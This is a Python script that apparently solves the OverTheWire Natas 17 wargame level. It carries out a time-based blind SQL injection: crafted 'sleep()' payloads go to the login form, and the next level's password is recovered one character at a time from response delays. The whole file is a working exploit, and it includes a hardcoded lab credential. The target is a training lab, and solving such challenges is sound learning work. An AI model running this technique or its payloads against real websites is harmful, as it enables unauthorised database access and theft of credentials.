#!/usr/local/bin/python

import sys
import requests
import base64
import string
import time

#print "First argument is " + str(sys.argv[1])

url = 'http://natas17.natas.labs.overthewire.org/index.php?debug'

prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}


charseq = list(string.ascii_lowercase + string.ascii_uppercase + "0123456789")
req_data_first = 'username=natas18%22%20AND%20IF(password%20LIKE%20BINARY%20%22'
req_data_last = '%%22,%20sleep(3),%20null)--%20'
pwd = "xvKIq"

hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', data='username=natas18', headers=hdrs, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), proxies=prx)
exec_time = r.elapsed.total_seconds()
print "REGULAR - " + str(exec_time)
r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', data='username=natas18%22%20AND%20IF(1=1,%20sleep(5),%20null)--%20', headers=hdrs, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), proxies=prx)
exec_time = r.elapsed.total_seconds()
print "VALID - " + str(exec_time)
r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', data='username=natas18%22%20AND%20IF(1=4,%20sleep(5),%20null)--%20', headers=hdrs, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), proxies=prx)
exec_time = r.elapsed.total_seconds()
print "INVALID - " + str(exec_time)


for i in range(32):
    max_exec_time = 0
    for char in charseq:
        req_data = req_data_first + pwd + char + req_data_last
        #req_data = "username=natas16"
        print req_data
        r = requests.post(url, data=req_data, headers=hdrs, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), proxies=prx)
        #time.sleep(0.5)
        exec_time = r.elapsed.total_seconds()
        print char + " - " + str(exec_time)
        if exec_time > max_exec_time:
            #print "DEBUG +"
            suggested_char = char
            max_exec_time = exec_time
            #print suggested_char + " - " + str(exec_time)
    pwd += suggested_char
    print pwd

#print resp.read()
